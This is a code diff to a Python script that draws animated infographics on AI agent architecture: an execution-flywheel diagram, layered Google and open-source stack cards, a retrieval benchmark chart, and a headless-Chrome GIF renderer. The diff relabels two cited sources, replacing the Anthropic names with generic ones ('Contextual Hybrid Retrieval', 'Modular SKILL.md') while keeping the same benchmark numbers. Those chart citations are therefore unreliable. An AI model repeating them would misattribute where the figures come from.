+    ], 10.2, 600, INK, 15.5))
+    key_rows = [
+        (PURPLE, "Step 2: Reason & Plan (LLM)"),
+        ("#EA580C", "Step 3: Scoped Tool Call (MCP)"),
+        (SKY, "Step 4: Checkpoint State (DB)"),
+        (GREEN, "Step 5/6: Gate & Verified Exit"),
+    ]
+    for k_idx, (kcol, ktxt) in enumerate(key_rows):
+        ky = 752 + k_idx * 26
+        b.append(f'<circle cx="56" cy="{ky}" r="5.5" fill="{kcol}"/>')
+        b.append(_t(70, ky + 4, ktxt, 9.8, 700, SLATE))
+
+    # Top Center Flywheel Header Banner (x=308..956, y=132..196) aligning top edge with Left & Right columns
+    b.append(_r(308, 132, 648, 64, 10, WHITE, "#F59E0B", 1.6))
+    b.append(_r(308, 132, 8, 64, 4, AMBER))
+    b.append(_t(328, 156, "DETERMINISTIC AGENT EXECUTION FLYWHEEL (STEPS 2–5)", 11.0, 800, "#B45309"))
+    b.append(_t(328, 178, "Each turn plans 1 action, executes 1 scoped MCP call, checkpoints state, and tests the exit gate.", 10.5, 600, SLATE))
+
+    # Center Flywheel Orbit (cx=632, cy=498, R=216, cw=216, ch=104 -> Left edge 308, Right edge 956)
+    cx, cy, R = 632, 498, 216
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="{R + 16}" fill="none" stroke="#E2E8F0" stroke-width="1.2" stroke-dasharray="4 6"/>')
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="{R}" fill="none" stroke="#FDE68A" stroke-width="2.2" stroke-dasharray="6 6"/>')
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="96" fill="#FEFCE8" stroke="#F59E0B" stroke-width="2.6" stroke-dasharray="8 5"/>')
+    b.append(_pill(cx - 60, cy - 68, "ITERATIVE KERNEL", AMBER, "#FEF3C7", size=8.2, h=18, text_fill="#92400E")[0])
+    b.append(_tl(cx, cy - 28, s["center_lines"][:4], 10.8, 800, "#92400E", 16.0, "middle"))
+    b.append(_r(cx - 68, cy + 40, 136, 20, 10, "#FFFBEB", AMBER, 1.1))
+    b.append(_t(cx, cy + 54, "ADK • LANGGRAPH", 8.5, 800, "#B45309", "middle", mono=True))
+
     angles = [180, 270, 360, 450]
     nodes = s["loop_nodes"][:4]
     cols = [PURPLE, "#EA580C", SKY, GREEN]
+    loop_stacks = [
+        "GOOGLE: Gemini 4 • OSS: vLLM",
+        "GOOGLE: IAM • OSS: OPA + MCP",
+        "GOOGLE: Firestore • OSS: Postgres",
+        "GOOGLE: ADK • OSS: OpenHands",
+    ]
     for i in range(4):
-        a0, a1 = angles[i] + 22, angles[(i + 1) % 4] - 22 if i < 3 else 450 - 22 + 90
-        if i == 3:
-            a0, a1 = 450 + 22, 540 - 22
+        a0 = angles[i] + 30
+        a1 = (angles[(i + 1) % 4] - 30) if i < 3 else (540 - 30)
         pts = _arc_pts(cx, cy, R, a0, a1)
-        b.append(_flow(pts, cols[i], phase, None, 2.4, 3.8, True, 2, dash="12 9"))
+        b.append(_flow(pts, cols[i], phase, None, 2.2, 3.4, True, 1, dash="11 8"))
+
+    cw, ch = 216, 104
     for i, n in enumerate(nodes):
         ang = math.radians(angles[i])
         px, py = cx + R * math.cos(ang), cy + R * math.sin(ang)
-        b.append(_card_head(px - 112, py - 42, 224, 84, cols[i], n["badge"], head_h=24))
-        b.append(_t(px, py + 6, n["title"], 12.5, 800, INK, "middle"))
-        b.append(_t(px, py + 26, n["sub"], 9.5, 600, SLATE, "middle"))
-    st1 = s["entry"]
-    b.append(_card_head(56, 150, 250, 112, BLUE, st1["badge"]))
-    b.append(_tl(72, 196, _wrap(st1["text"], 32, 3), 11.5, 700, INK, 16))
-    b.append(_flow([(181, 262), (181, 496)], BLUE, phase, "CONTEXT IN", 1.8, 3.4, True, 1, label_at=0.45))
+        x0, y0 = px - cw / 2, py - ch / 2
+        b.append(_card_head(x0, y0, cw, ch, cols[i], n["badge"], head_h=24))
+        b.append(_t(px, y0 + 43, n["title"], 11.4, 800, INK, "middle"))
+        b.append(_t(px, y0 + 60, n["sub"], 9.5, 600, SLATE, "middle"))
+        b.append(_r(x0 + 10, y0 + 70, cw - 20, 24, 6, "#F8FAFC", cols[i], 1.1))
+        b.append(_t(px, y0 + 86, loop_stacks[i], 8.4, 800, cols[i], "middle", mono=True))
+
+    # Exit flow from Step 5 (bottom of wheel: x=632, y=766) -> Step 6 Card (x=992, y=766)
     ex = s["exit"]
-    b.append(_flow([(622, 830), (1038, 830)], GREEN, phase, ex["arrow_label"], 2.2, 4, True, 2, label_at=0.5))
-    b.append(_card_head(1040, 788, 504, 84, GREEN, ex["badge"]))
-    b.append(_tl(1056, 834, _wrap(ex["text"], 66, 2), 11.5, 700, INK, 16))
-    b.append(_r(1000, 140, 564, 620, 12, WHITE, LINE, 1.8))
-    b.append(_r(1000, 140, 564, 34, 10, NAVY))
-    b.append(_t(1018, 162, s["panel_title"], 11.5, 800, WHITE))
+    b.append(_flow([(632, 766), (632, 832), (992, 832)], GREEN, phase, ex["arrow_label"], 2.0, 3.8, True, 1, label_at=0.58))
+    b.append(_card_head(992, 766, 572, 116, GREEN, ex["badge"], head_h=26))
+    b.append(_tl(1008, 812, _wrap(ex["text"], 68, 2), 11.2, 700, INK, 16))
+    b.append(_r(1008, 844, 540, 26, 6, "#ECFDF5", GREEN, 1.1))
+    b.append(_t(1278, 861, "GOOGLE: Cloud Trace + Model Armor  •  OSS: OpenTelemetry + Langfuse + Receipt SHA", 9.4, 800, "#065F46", "middle", mono=True))
+
+    # Right Gate Governance Panel (x=992..1564, y=132..748)
+    b.append(_r(992, 132, 572, 616, 12, WHITE, LINE, 1.8))
+    b.append(_r(992, 132, 572, 34, 10, NAVY))
+    b.append(_t(1010, 154, s["panel_title"], 11.0, 800, WHITE))
+    gate_badges = ["exit_code == 0", "max_steps <= 15", "budget <= $0.25", "sha256 < 2x / 5t", "WAL checkpoint"]
     for i, row in enumerate(s["panel_rows"][:5]):
-        ry = 190 + i * 108
-        b.append(_r(1018, ry, 528, 94, 8, "#F8FAFC", row["color"], 1.6))
-        b.append(_r(1018, ry, 8, 94, 4, row["color"]))
-        b.append(_t(1040, ry + 24, row["head"], 11, 800, row["color"]))
-        b.append(_tl(1040, ry + 46, _wrap(row["body"], 66, 3), 11.5, 600, "#1E293B", 16))
+        ry = 180 + i * 110
+        b.append(_r(1008, ry, 540, 98, 8, "#F8FAFC", row["color"], 1.6))
+        b.append(_r(1008, ry, 8, 98, 4, row["color"]))
+        b.append(_t(1028, ry + 22, row["head"], 10.8, 800, row["color"]))
+        b.append(_pill(1536, ry + 8, gate_badges[i], row["color"], WHITE, size=8.8, h=20, anchor_end=True)[0])
+        b.append(_tl(1028, ry + 44, _wrap(row["body"], 67, 3), 10.8, 600, "#1E293B", 15.5))
     return _frame("T05", TEMPLATE_META["T05"], s["title"], s["subtitle"], b, s["source"])
+
 
 
 # ----------------------------------------------------------------------------------------------------------------------
@@ -1290,8 +1511,8 @@ def _demo_specs() -> Dict[str, Dict[str, Any]]:
             "layers": [
                 {"code": "L5", "name": "EXPERIENCE & GOVERNANCE", "color": "#2563EB", "chips": ["Cloud Run UI / Knative", "HITL approvals: IAP / Keycloak", "OpenTelemetry -> Trace / Langfuse", "Cloud Monitoring / Grafana"], "desc": "Where humans see results, approve risky writes, and watch budgets — identical UX on either stack.", "guarantee": "Every answer ships with a receipt; risky writes need a signed human click."},
                 {"code": "L4", "name": "AGENT HARNESS", "color": "#7C3AED", "chips": ["Google ADK (OSS) / LangGraph", "Loop breaker: RunConfig / recursion_limit", "Verify hook: OpenHands / E2B", "Checkpoints: Workflows / Temporal"], "desc": "Deterministic guards around the LLM; the same controls exist in ADK, LangGraph, CrewAI, and AutoGen.", "guarantee": "No infinite loops, no fake 'done', no duplicate side effects."},
-                {"code": "L3", "name": "MODEL & TOOL ROUTING", "color": "#D97706", "chips": ["Gemini 4 Argon / 3.8 Flash", "Gemma 3 on vLLM / Ollama", "LiteLLM + dynamic MCP router", "Model Armor / Llama Guard"], "desc": "Right model per step, only the Top-3 tools per step, sanitized in and out.", "guarantee": "<= 7 schemas per call; untrusted content never reaches write tools."},
-                {"code": "L2", "name": "MEMORY & DATA", "color": "#059669", "chips": ["Firestore / PostgreSQL + Redis", "AlloyDB pgvector / Qdrant", "Evidence receipts (git blob SHA)", "BigQuery / ClickHouse trajectories"], "desc": "Durable state, SHA-stamped memory claims, and every trajectory kept for replay.", "guarantee": "Resume at step N; stale memory is flagged, never served as truth."},
+                {"code": "L3", "name": "MODEL & TOOL ROUTING", "color": "#D97706", "chips": ["Gemini 4 Argon / DeepSeek-R1 vLLM", "Gemini 3.8 Flash / Gemma 3 Ollama", "Vertex Router / LiteLLM + MCP", "Model Armor / Llama Guard 3"], "desc": "Right model per step, only the Top-3 tools per step, sanitized in and out.", "guarantee": "<= 7 schemas per call; untrusted content never reaches write tools."},
+                {"code": "L2", "name": "MEMORY & DATA", "color": "#059669", "chips": ["Firestore / PostgreSQL + Redis", "AlloyDB pgvector / Qdrant", "GCS Object Lock / Git SHA Receipts", "BigQuery / ClickHouse trajectories"], "desc": "Durable state, SHA-stamped memory claims, and every trajectory kept for replay.", "guarantee": "Resume at step N; stale memory is flagged, never served as truth."},
                 {"code": "L1", "name": "ZERO-TRUST FOUNDATION", "color": "#334155", "chips": ["VPC-SC / Kubernetes NetworkPolicy", "Cloud KMS / Vault (OpenBao)", "Workload Identity / SPIFFE-SPIRE", "Cloud Armor / Coraza WAF"], "desc": "Identity, encryption, and network boundaries every layer above inherits.", "guarantee": "Least privilege by default; keys and data never leave the perimeter."},
             ],
             "bottom_note": "Rule of thumb: pick the managed service when you want the SLA, the open-source twin when you need portability — the guarantees per layer must not change.",
@@ -1369,10 +1590,10 @@ def _demo_specs() -> Dict[str, Dict[str, Any]]:
         "T08": {
             "title": "Retrieval Architecture Benchmark: Chunk-Only Vector RAG vs. Contextual Hybrid + GraphRAG + CRAG",
             "subtitle": "Each bar pair is normalized to its own 'before' error rate; combining Contextual BM25, GraphRAG communities, and a Corrective RAG gate cuts failure modes across the board.",
-            "source": "Sources: Anthropic Contextual Retrieval (Sep 2024) • Microsoft GraphRAG (Edge et al. 2024) • CRAG (Yan et al. 2024) • Aurimas Griciūnas",
+            "source": "Sources: Contextual Hybrid Retrieval (Sep 2024) • Microsoft GraphRAG (Edge et al. 2024) • CRAG (Yan et al. 2024) • Aurimas Griciūnas",
             "chart_title": "BEFORE: CHUNK-ONLY VECTOR RAG (RED) VS. AFTER: CONTEXTUAL HYBRID + GRAPHRAG + CRAG (GREEN)",
             "metrics": [
-                {"name": "Failed retrieval recall@20", "unit": "top-20 retrieval miss rate across domain corpora", "before": 5.7, "after": 1.9, "before_label": "5.7% miss rate", "after_label": "1.9% miss rate", "delta": "-67.0%", "source": "Anthropic Contextual Retrieval benchmark: Contextual Embeddings + Contextual BM25 + Reranker"},
+                {"name": "Failed retrieval recall@20", "unit": "top-20 retrieval miss rate across domain corpora", "before": 5.7, "after": 1.9, "before_label": "5.7% miss rate", "after_label": "1.9% miss rate", "delta": "-67.0%", "source": "Contextual Hybrid Retrieval benchmark: Contextual Embeddings + Contextual BM25 + Reranker"},
                 {"name": "Multi-hop entity synthesis errors", "unit": "cross-document questions missing global entity links", "before": 46.0, "after": 11.5, "before_label": "46.0% missed hops", "after_label": "11.5% missed hops", "delta": "-75.0%", "source": "GraphRAG hierarchical Leiden community summaries + AlloyDB / Neo4j knowledge graph"},
                 {"name": "Irrelevant chunk poison rate", "unit": "low-relevance chunks injected into generator prompt", "before": 34.0, "after": 4.2, "before_label": "34.0% noisy chunks", "after_label": "4.2% noisy chunks", "delta": "-87.6%", "source": "Corrective RAG (CRAG) lightweight retrieval evaluator + query rewrite / web fallback"},
                 {"name": "Ungrounded answer claims", "unit": "final sentences lacking a verified span citation", "before": 22.4, "after": 1.8, "before_label": "22.4% ungrounded", "after_label": "1.8% ungrounded", "delta": "-92.0%", "source": "Deterministic citation check + JEV sentence-level entailment gate before user reply"},
@@ -1469,7 +1690,7 @@ def _demo_specs() -> Dict[str, Dict[str, Any]]:
         "T13": {
             "title": "Static Tool-Schema Dump vs. Sandboxed CodeAct + Progressive SKILL.md Discovery",
             "subtitle": "Mounting 85 raw JSON tool schemas bloats every turn and executes unsandboxed calls; progressive disclosure + gVisor CodeAct cuts tokens by 93%.",
-            "source": "Sources: OpenHands CodeAct (Wang et al. 2024) • Paul Iusztin • Philipp Schmid • Anthropic SKILL.md & MCP Tool Search",
+            "source": "Sources: OpenHands CodeAct (Wang et al. 2024) • Paul Iusztin • Philipp Schmid • Modular SKILL.md & MCP Tool Search",
             "before_head": "BEFORE — 85 static MCP JSON schemas + host-process execution",
             "after_head": "AFTER — Progressive SKILL.md discovery + gVisor CodeAct sandbox",
             "before_lines": [
@@ -1644,7 +1865,7 @@ def _demo_specs() -> Dict[str, Dict[str, Any]]:
             "tree_title": "gcp-adk-loop-circuit-breaker/  (18/18 verified)",
             "tree": [
                 "gcp-adk-loop-circuit-breaker/",
-                "├── AGENTS.md  ·  GEMINI.md  ·  CLAUDE.md",
+                "├── AGENTS.md  ·  GEMINI.md",
                 "├── .openhands/microagents/repo.md",
                 "├── .mcp.json",
                 "├── app.py",
@@ -1829,7 +2050,7 @@ def render_template(tid: str, spec: Optional[Dict[str, Any]] = None, phase: Opti
 
 def render_template_gif(tid: str, gif_path: Path, png_path: Optional[Path] = None, frames: int = 6,
                         spec: Optional[Dict[str, Any]] = None) -> bool:
-    """Compile a looping Animated GIF (plus a crisp PNG of the final frame) via Headless Chrome + ffmpeg."""
+    """Compile a looping Animated GIF (plus a crisp 2x Retina PNG of the final frame) via Headless Chrome + ffmpeg."""
     chrome, ffmpeg = Path(CHROME_BIN), Path(FFMPEG_BIN)
     if not chrome.exists() or not ffmpeg.exists():
         return False
@@ -1846,10 +2067,12 @@ def render_template_gif(tid: str, gif_path: Path, png_path: Optional[Path] = Non
             mh = _re.search(r'<svg[^>]*\bheight="(\d+)"', svg_text)
             win_w = int(mw.group(1)) if mw else W
             win_h = int(mh.group(1)) if mh else H
-            subprocess.run([str(chrome), "--headless", "--disable-gpu", f"--window-size={win_w},{win_h}", f"--screenshot={frame_png}",
+            subprocess.run([str(chrome), "--headless", "--disable-gpu", "--hide-scrollbars", f"--window-size={win_w},{win_h}", f"--screenshot={frame_png}",
                             f"file://{frame_svg}"], check=False, capture_output=True)
-            if i == frames - 1 and png_path is not None and frame_png.exists():
-                png_path.write_bytes(frame_png.read_bytes())
+            if i == frames - 1 and png_path is not None:
+                subprocess.run([str(chrome), "--headless", "--disable-gpu", "--hide-scrollbars", "--force-device-scale-factor=2",
+                                f"--window-size={win_w},{win_h}", f"--screenshot={png_path}", f"file://{frame_svg}"],
+                               check=False, capture_output=True)
         subprocess.run([str(ffmpeg), "-y", "-framerate", "4", "-i", str(tmp_path / "frame_%02d.png"), "-vf",
                         "split[s0][s1];[s0]palettegen=max_colors=128:stats_mode=diff[p];[s1][p]paletteuse=dither=bayer:bayer_scale=5",
                         "-loop", "0", str(gif_path)], check=False, capture_output=True)
